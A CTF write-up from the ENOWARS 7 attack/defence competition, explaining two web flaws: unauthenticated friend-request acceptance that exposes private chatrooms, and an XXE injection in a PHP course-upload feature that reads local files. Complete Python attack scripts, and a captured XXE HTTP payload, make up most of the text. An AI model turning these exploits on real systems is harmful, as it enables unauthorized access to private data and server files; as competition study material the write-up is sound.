*2023-07-22*

#ctf-writeup 

> [!Abstract] Introduction
> ENOWARS 7 was an Attack/Defence CTF hosted in the summer of 2023. During the competition, teams are given a Linux-based vulnbox the runs a number of vulnerable services. 
> 
> The objective of the game is to find and patch vulnerabilities on your own machine while simultaneously exploiting those same vulnerabilities against everyone else. This leads to a fast-paced competition that tests lots of different skills. 
> 
> This year's ENOWARS was very well put together, and my team and I had a lot of fun competing.
> 
> https://ctftime.org/event/2040

---

# asocialnetwork
**Category: Web**

For this service, we were given a node.js application running through a Docker container. Only a single port, `3000`, was exposed. When navigating to the service in a web browser you are taken to a mock social media platform, complete with friend requests and a fully-functional chatroom. 

The page is also quite stylish!

![[../Files/Pasted image 20230722220044.png]]

During an attack/defence CTF, flags are updated once per "tick", or in other words the flags change once a minute. After each tick, information about where to find the new flags is published. In this case, it was a username, indicating that we had to read the flag from some data that was associated with a specific user.

One feature of the platform was that you could create private chatrooms only available to your friends. We guessed that the flags would be hidden in one of these chatrooms, and needed to figure out how to get access.

We found that the POST endpoint that is used to accept a friend request does not have any authentication, meaning we can accept a friend request for a user different than our own.

> [!Todo]
> We decided we needed to do the following:
> 1. Create a new user account
> 2. Send a friend request to a user with a flag
> 3. Accept our friend request on behalf of that user
> 4. View the user's private chatrooms and steal the flag

## Creating a user account
Creating the user account was quite simple as it was just a matter of sending the correct POST request to the `/register` endpoint.

The following Python 3 code automated the process:

```python
def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username,
        "confirmPassword": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}/register", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Sending a friend request
We automated this step too. After creating a new user we sent a POST request to the `/friends/requests` endpoint which created a new friend request.

```python
def add_friend(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "send",
    }

    print(f"Adding friend {to_u}... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Accepting the friend request
This is where the magic happens! Because there is no authentication when accepting friend requests, we can send a POST request to the `/friends/requests` endpoint asking it to accept. This will add as a friend to the user with the flag without their consent.

```python
def accept_request(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "accept",
    }

    print("Accepting request... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Viewing the private chatrooms
Now that we are friends with the user can see their private chatrooms. Finding the link to the chatroom is slightly more complicated.

First, we performed a GET request to the `/profile` endpoint. This allowed us view the private profile page of the user and listed the names of their chatrooms. The BeautifulSoup library was used to help with HTML parsing.

```python
def get_rooms(friend, endpoint=None):
    print("Getting rooms...", end="")
    r = s.get(f"{endpoint}/profile/{friend}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    rooms = parsed_html.find_all("div", {"class": "room"})

    room_list = []
    for room in rooms:
        room_name = room.find("h3").text
        room_list.append(room_name)

    return room_list
```

After finding the room names we needed to get the ID to the chatroom itself so that we can include it in the URI. Reading through the source code, we found that the ID is generated using the SHA-256 hash of the room's name.

```js
// chatroomRouter.js

router.post('/', async (req, res) => {
    try {
        let chatroom = await Chatroom.findOne({ id: crypto.createHash('sha256').update(req.body.roomname).digest('hex') }).lean()
        if (typeof req.body.roomname !== 'string') {
            res.status(400).send('Room Name must be a string')
            return
        }
	...
	}
}
```

Since we know the room's name already, we can generate the ID again ourselves by re-generating the hash.

```python
room_id = sha256(room.encode("utf-8")).hexdigest()
```

Finally, we can hit the `/chatroom` endpoint and get the flag!

```python
def get_flag(room_name, endpoint=None):
    print("Getting flags from chatroom...", end="")
    r = s.get(f"{endpoint}/chatroom/{room_name}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    messages = parsed_html.find_all("p")

    flags = []
    for message in messages:
        flag = message.text

        if "ENO" in flag:
            flags.append(flag)

    return flags
```

> [!Success]
> The flags were in fact in the private chatroom of the user! Once we had a proof of concept we were able to put all of the automation steps together and attack other teams who had not yet patched the vulnerability!

The following script was used to continually attack other teams and extract flags:

```python
import requests
import uuid
from hashlib import sha256
import json

from pushflag import submit_flag
from bs4 import BeautifulSoup

s = None

TIMEOUT = 4

BLOCKLIST = []

def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username,
        "confirmPassword": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}/register", data=data, timeout=TIMEOUT)
    print(r.status_code)

def add_friend(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "send",
    }

    print(f"Adding friend {to_u}... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)

def accept_request(from_u, to_u, endpoint=None):
    data = {
        "partner": to_u,
        "userName": from_u,
        "status": "accept",
    }

    print("Accepting request... ", end="")
    r = s.post(f"{endpoint}/friends/requests", data=data, timeout=TIMEOUT)
    print(r.status_code)

def get_rooms(friend, endpoint=None):
    print("Getting rooms...", end="")
    r = s.get(f"{endpoint}/profile/{friend}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    rooms = parsed_html.find_all("div", {"class": "room"})

    room_list = []
    for room in rooms:
        room_name = room.find("h3").text

        room_list.append(room_name)

    return room_list

def get_flag(room_name, endpoint=None):
    print("Getting flags from chatroom...", end="")
    r = s.get(f"{endpoint}/chatroom/{room_name}", timeout=TIMEOUT)
    print(r.status_code)

    parsed_html = BeautifulSoup(r.text, "html.parser")
    messages = parsed_html.find_all("p")

    flags = []
    for message in messages:
        flag = message.text

        if "ENO" in flag:
            flags.append(flag)

    return flags

def pwn(ip, friend):
    global s

    endpoint = f"http://{ip}:3000"

    s = requests.Session()

    username = uuid.uuid4()

    create_account(username, endpoint=endpoint)

    add_friend(username, friend, endpoint=endpoint)
    accept_request(username, friend, endpoint=endpoint)

    rooms = get_rooms(friend, endpoint=endpoint)

    all_flags = []
    for room in rooms:
        room_hash = sha256(room.encode("utf-8")).hexdigest()
        flags = get_flag(room_hash, endpoint=endpoint)

        all_flags += flags

    for flag in all_flags:
        print(f"Flag: {flag}")
        response = submit_flag(f"{flag}", "10.0.13.37", 1337)
        print(f"Flag submitted: {response}")


    if len(all_flags) == 0:
        print("No flags!")


def get_all_teams():
    j = requests.get("https://7.enowars.com/scoreboard/attack.json", timeout=TIMEOUT).json()

    return j

def main():
    while True:
        try:
            team_data = get_all_teams()

            for team in team_data["availableTeams"]:
                try:
                    if team in BLOCKLIST:
                        continue

                    print(f"Pwning {team}")
                    data = team_data["services"]["asocialnetwork"][team]
                    latest_tick = sorted(list(data.keys()))[-1]
                    friend_1 = json.loads(data[latest_tick]["1"][0])["username"]

                    pwn(team, friend_1)

                except Exception as e:
                    print(e)

                print("=" * 64)
                print()

        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()
```

---

# oldschool
**Category: Web**

This service was another web service running under Docker. It was written in PHP, a language I am less confident with, and was running on port `9080`. This service was meant to replicate a school management system, allowing students to enrol in courses and view their grades.

![[../Files/Pasted image 20230722223104.png]]

Our discovery of one of the exploits was not found by reviewing the source code. Instead, we found a malicious HTTP payload in a packet capture we had running on our vulnbox. The response to the request had one of our flags, so we knew this was a valid exploit.

The HTTP request looked like the following:

```http
POST /?action=courses
HTTP/1.1 Host: 10.1.28.1:9080
User-Agent: python-requests/2.31.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive
Cookie: PHPSESSID=415bd8c31ad93129a1cd5ffbed956105
Content-Length: 513
Content-Type: multipart/form-data; boundary=7a9bf3531b4f35a4f2f3cf4f0865b2e3

--7a9bf3531b4f35a4f2f3cf4f0865b2e3
Content-Disposition: form-data; name="is_private"

on
--7a9bf3531b4f35a4f2f3cf4f0865b2e3
Content-Disposition: form-data; name="title" 

RAAYBG
--7a9bf3531b4f35a4f2f3cf4f0865b2e3 Content-Disposition: form-data; name="EFsfa.xml"; filename="EFsfa.xml"

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/68518_9756b1161f58cb5c1dd67633666c6674" >]><data>&xxe;</data>
--7a9bf3531b4f35a4f2f3cf4f0865b2e3--
```

What's interesting here is the XML file that was being uploaded. It looked like they were exploiting an XXE injection, which allows for misconfigured XML parsers to view files on the filesystem. In the attacker's case, they were reading the contents of the file at `/service/grades/68518_9756b1161f58cb5c1dd67633666c6674`.

Looking at this we did what any good hacker would do, so we stole it.

The "Courses" page allowed you to upload an XML file that was meant to contain course data, so this was the likely vector for our injection.

> [!Todo]
> Our goal was split into three parts:
> 1. Create a new user account
> 2. Create a new course with a malicious XML file
> 3. Get the flag from the course data

## Creating a new user
Creating a new user required us to send a POST request to `/index.php?action=register`.

```python
def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}?action=register", data=data, timeout=TIMEOUT)
    print(r.status_code)
```

## Creating a course with the XXE injection
The flag was indicated to be in a file on the filesystem. In this case, those paths were given by the CTF organisers on each tick, so we already knew where to look.

It was a matter of making a POST to the `/index.php?action=courses` endpoint that contained multipart form data that included our course details and our malicious XML payload.

```python
def upload_xxe(grade_file, endpoint=None):
    files = {
        "course_data": ("test.xml", f"""<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/{grade_file}"
 >]><data><course><name>&xxe;</name></course></data>""", "text/xml"),
        "title": (None, "testa", None),
        "is_private": (None, "on", None)
    }

    print(f"Uploading course data with {grade_file}... ", end="")
    r = s.post(f"{endpoint}?action=courses", files=files, timeout=TIMEOUT)
    print(r.status_code)

    i1 = r.text.find("Course added successfully with ID:") + 35
    i2 = r.text.find("</p>", i1)

    course_id = r.text[i1:i2]

    return course_id
```

## Getting the flag from course data
Our XML payload set the contents of the flag's file to be the name of the course. This means that all we have to do is go back to the main course page and view all of the courses our use is associated with. This can be done with a GET request to `index.php?action=courses`.

```python
def get_flag(course_id, endpoint=None):
    print(f"Getting flag... ", end="")
    r = s.get(f"{endpoint}?action=courses", params={"id": course_id}, timeout=TIMEOUT)
    print(r.status_code)

    i1 = r.text.find("<course><name>") + 14
    i2 = r.text.find("</name></course>", i1)

    flag = r.text[i1:i2]

    if "ENO" in flag:
        return flag

    return None
```

> [!Success]
> And that's all there is to it! After uploading the malicious XML file, the contents of the file were read and the flag was set as the course's name! We solved this exploit near the end of the CTF, so we weren't able to steal as many flags from other teams. Regardless, I'm glad we got a working exploit!

Here's the final script we used to continually run the exploit against all the other vulnboxes:

```python
import requests
import uuid

from pushflag import submit_flag
from bs4 import BeautifulSoup

TIMEOUT = 4

BLOCKLIST = []

s = None

def create_account(username, endpoint=None):
    data = {
        "username": username,
        "password": username
    }

    print(f"Creating account {username}... ", end="")
    r = s.post(f"{endpoint}?action=register", data=data, timeout=TIMEOUT)
    print(r.status_code)

def upload_xxe(grade_file, endpoint=None):
    files = {
        "course_data": ("test.xml", f"""<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///service/grades/{grade_file}" >]><data><course><name>&xxe;</name></course></data>""", "text/xml"),
        "title": (None, "testa", None),
        "is_private": (None, "on", None)
    }

    print(f"Uploading course data with {grade_file}... ", end="")
    r = s.post(f"{endpoint}?action=courses", files=files, timeout=TIMEOUT)
    print(r.status_code)

    i1 = r.text.find("Course added successfully with ID:") + 35
    i2 = r.text.find("</p>", i1)

    course_id = r.text[i1:i2]

    return course_id

def get_flag(course_id, endpoint=None):
    print(f"Getting flag... ", end="")
    r = s.get(f"{endpoint}?action=courses", params={"id": course_id}, timeout=TIMEOUT)
    print(r.status_code)

    i1 = r.text.find("<course><name>") + 14
    i2 = r.text.find("</name></course>", i1)

    flag = r.text[i1:i2]

    if "ENO" in flag:
        return flag

    return None

def pwn(ip, grade_file):
    global s

    endpoint = f"http://{ip}:9080"

    s = requests.Session()
    username = uuid.uuid4()

    create_account(username, endpoint=endpoint)
    course_id = upload_xxe(grade_file, endpoint=endpoint)
    flag = get_flag(course_id, endpoint=endpoint)

    if flag:
        print(f"Flag: {flag}")
        response = submit_flag(f"{flag}", "10.0.13.37", 1337)
        print(f"Flag submitted: {response}")

    else:
        print("No flag!")

def get_all_teams():
    j = requests.get("https://7.enowars.com/scoreboard/attack.json", timeout=TIMEOUT).json()

    return j

def main():
    while True:
        try:
            team_data = get_all_teams()

            for team in team_data["availableTeams"]:
                try:
                    if team in BLOCKLIST:
                        continue

                    print(f"Pwning {team}")

                    data = team_data["services"]["oldschool"][team]

                    latest_tick = sorted(list(data.keys()))[-1]

                    grade_file = data[latest_tick]["1"][0]
                    grade_file = grade_file[grade_file.find("Grade") + 6:]

                    pwn(team, grade_file)

                except Exception as e:
                    print(e)

                print("=" * 64)
                print()

        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()
```

---

# Conclusion
Attack/Defence CTFs don't come around too often, especially in North America. Because of this, we like to make the most of them whenever we get the opportunity to play. One fear is that a CTF will be too challenging, or too easy, to make it rewarding to participate in.

In this competition I primarily focused on attacking services and making sure we had a good SLA. I never managed to patch the vulnerabilities that we found, despite the fixes being well-documented online. This is a skill I would like to improve on for next time.

For ENOWARS 7, the organisers did a great job of creating fun and innovative challenges that hit the sweet spot of difficulty and reward. Despite having to wake up at 4:45 am (the organisers are based in Germany), I had a great time with this CTF and look forward to a sequel next year!

---